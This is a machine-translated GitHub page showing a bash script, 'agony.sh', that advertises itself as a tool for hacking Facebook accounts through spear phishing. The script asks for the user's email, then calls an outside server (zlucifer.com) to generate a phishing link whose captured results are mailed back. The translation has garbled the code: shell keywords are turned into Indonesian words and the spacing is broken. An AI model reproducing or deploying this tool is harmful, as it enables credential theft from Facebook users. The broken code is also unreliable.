@@ -1,0 +1,138 @@
+Langsung ke konten
+Pelajari Git dan GitHub tanpa kode apa pun!
+Dengan menggunakan panduan Hello World, Anda akan memulai sebuah cabang, menulis komentar, dan membuka permintaan penarikan.
+
+
+zlucifer.dll
+/
+agony_project
+Kode
+Masalah
+2
+Tarik permintaan
+Tindakan
+Proyek
+Wiki
+Keamanan
+Wawasan
+agony_project/ agony.sh
+@tokopedia
+zlucifer Perbarui agony.sh
+ 1 kontributor
+115 baris (115 sloc)  3,91 KB
+ 
+#! / bin / bash
+# /////////////////////////////////////////////// //////////////////////////////
+# /////////////////////////////////////////////// //////////////////////////////
+# //// _ _ __ ////
+# //// | | (_) / _ | ////
+# //// ___ | | _ _ ___ _ | | _ ___ _ __ ////
+# //// | _ / | | | | / __ | | _ / _ \ '__ | ////
+# //// / / | | | _ | | (__ | | || __ / | ////
+# //// / ___ | _ | \ __, _ | \ ___ | _ | _ | \ ___ | _ | ////
+# //// ////
+# /////////////////////////////////////////////// //////////////////////////////
+# /////////////////////////////////////////////// //////////////////////////////
+# PERINGATAN: KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI
+# GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :)
+penderitaan () {
+      bersih
+      echo  "          ,. * ====. '.' . ==== *., "
+      tidur 0,03
+      echo  "         .- / c)}}},: ...:, {{{(c \ -. "
+      tidur 0,03
+      echo  "     _.-'- 6> {{{{{'' '' ''}}}}} <9 -'-._ "
+      tidur 0,03
+      echo  "    t |}}}}}} {{{{{{| y "
+      tidur 0,03
+      echo  "     \ __.___. '{{{{{{{}}}}}}}' .___.__ / "
+      tidur 0,03
+      echo  "          [__ /}}}}}}}} {{{{{{{\ __]   "
+      tidur 0,03
+      echo  "          {{{. ' '-._ _.-' '.}}} "
+      tidur 0,03
+      echo  "          }} / \ {{ "
+      tidur 0,03
+      echo  "          {{| AGONY Project |}} "
+      tidur 0,03
+      echo  "          }} | ============= | {{ "
+      tidur 0,03
+      echo  "   .------ {{{\,, /}}} ------. "
+      tidur 0,03
+      echo  " //.-------- ';;' ---------. \\  "
+      tidur 0,03
+      echo  " ((/// _ \ / _   \\ \)) "
+      tidur 0,03
+      echo  " (((- '' '-------' '' ----- '' '-------' '' -))) "
+      tidur 0,03
+}
+beban () {
+      echo -e " \ n "
+      bar = " >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
+      panjang batang = $ { # bar}
+      i = 0
+      sementara (( i < 100 )) ;  melakukan
+          n = $ (( i * panjang batang /  100 ))
+          printf  " \ e [00; 32m \ r [% - $ {barlength} s] \ e [00m "  " $ {bar : 0 : n} "
+          (( i + = ACAK % 5 + 2 ))
+          tidur 0.2
+      selesai
+}
+encrypt_mail = $ ( curl -s http://zlucifer.com/api/hackbae.php ? request = penderitaan )
+mulai () {
+      bersih
+      penderitaan mendalam
+      echo  " ================================================ = "
+      echo  " Masukan email kamu "
+      membaca email
+      gema
+      echo  " Apakah email " $ email  " sudah benar? "
+      echo  " y / n? "
+      baca cek_email
+      jika [ $ cek_email  =  " y " ] ;  kemudian
+            bersih
+            echo  " Membuat link .. "
+            beban
+            penderitaan mendalam
+            create = ` curl -s $ encrypt_mail /base64_maker.php ? email = $ email `
+            echo  " ================================================ = "
+            echo -e $ create
+            echo  " Hasil otomatis masuk ke email kamu "
+            echo  " ================================================ = "
+      lain
+            mulai
+      fi
+}
+bersih
+echo  " Memuat .. "
+beban
+penderitaan mendalam
+echo  " ================================================ = "
+echo Selamat datang kak, Siapa nick kaka ?  # tulisan keluar
+baca nick # membaca yang ditulis
+bersih
+penderitaan mendalam
+echo  " ================================================ = "
+tidur 2
+echo  " Agony Project adalah alat untuk meretas Facebook "
+tidur 0.2
+echo  "    Alat ini adalah Metode Phising Tombak Tingkat Lanjut "
+tidur 0.2
+echo  "             Menggunakan teknik 18+ "
+tidur 0.2
+echo  "        Hasil otomatis masuk ke email kamu "
+tidur 0,03
+echo  " ================================================ = "
+echo Selamat datang $ nick  " :) "
+gema
+echo  " Mulai Agony Project? "
+echo  " y / n? "
+baca mulai
+if [ $ mulai  =  " y " ] ;  kemudian
+      bersih
+      echo  " Memulai Proyek Agony .. "
+      beban
+      mulai
+lain
+      gema  " Kesalahan "
+fi
